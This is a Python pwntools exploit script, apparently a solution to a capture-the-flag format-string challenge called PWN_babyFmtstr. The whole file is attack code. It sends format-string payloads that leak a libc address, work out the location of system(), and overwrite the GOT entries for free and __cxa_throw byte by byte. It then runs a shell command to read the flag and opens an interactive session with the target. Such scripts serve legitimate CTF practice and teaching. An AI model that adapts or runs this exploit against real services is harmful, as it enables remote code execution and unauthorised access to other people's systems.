#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './PWN_babyFmtstr'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400fa3 # pop rdi ; ret

# elf, libc

# debug('b *0x400CA0')
# 0x400E93
fmt0 = '%14c%12$hhn%133c%13$hhn%25$pAAAA'+p64(elf.got['free']+1)+p64(elf.got['free'])
sla('please input name:\n',fmt0)
# rc()
# debug()
data = ru('AAAA')
log.hexdump(data[-14:])
libc_start_main_ret = eval(data[-14:])
info_addr('leak',libc_start_main_ret)

if is_remote:
    libcbase = libc_start_main_ret - 0x20830
if is_local:
    libcbase = libc_start_main_ret - 243 - libc.sym['__libc_start_main']

info_addr('libcbase',libcbase)
system = libcbase + libc.sym['system']
info_addr('system',system)

arg0=(system)&0xff
arg1=(system&0xff00)>>8
arg2=(system&0xff0000)>>16
arg3=(system&0xff000000)>>24
arg4=(system&0xff00000000)>>32
arg5=(system&0xff0000000000)>>40

sl('20')
sl(cyclic(10))

fmt1 = '%'+str(arg0)+'c%12$hhn%'+str((arg1-arg0+0x100)%0x100)+'c%13$hhn'
fmt1 = fmt1.ljust(32,'B')
fmt1+= p64(elf.got['__cxa_throw'])+p64(elf.got['__cxa_throw']+1)

sl(fmt1)

sl('20')
sl(cyclic(10))


fmt2 = '%'+str(arg2)+'c%12$hhn%'+str((arg3-arg2+0x100)%0x100)+'c%13$hhn'
fmt2 = fmt2.ljust(32,'C')
fmt2+= p64(elf.got['__cxa_throw']+2)+p64(elf.got['__cxa_throw']+3)

sl(fmt2)

sl('20')
sl(cyclic(10))


fmt3 = '%'+str(arg4)+'c%12$hhn%'+str((arg5-arg4+0x100)%0x100)+'c%13$hhn'
fmt3 = fmt3.ljust(32,'C')
fmt3+= p64(elf.got['__cxa_throw']+4)+p64(elf.got['__cxa_throw']+5)

sl(fmt3)

sl('20')
sl(cyclic(10))

# debug('b *0x400ef3\nb *0x0400d81')

# 0x400E71 - call __cxa_throw
# fmt4 = 'base64<flag;%101c%12$hhnAAAAAAAA'+p64(elf.got['free'])
# 0x400A30
fmt4 = 'base64<flag&&%2595c%12$hnAAAAAAA'+p64(elf.got['free'])
sl(fmt4)

sl('20')
sl('base64<flag')

# sla('please input name:\n',

# fmt = fmtstr_payload(8,{elf.got['sleep']:one_gadget},write_size='short')
# debug()
# sla('please input name:\n',fmt)

# log.warning('--------------')
p.interactive()
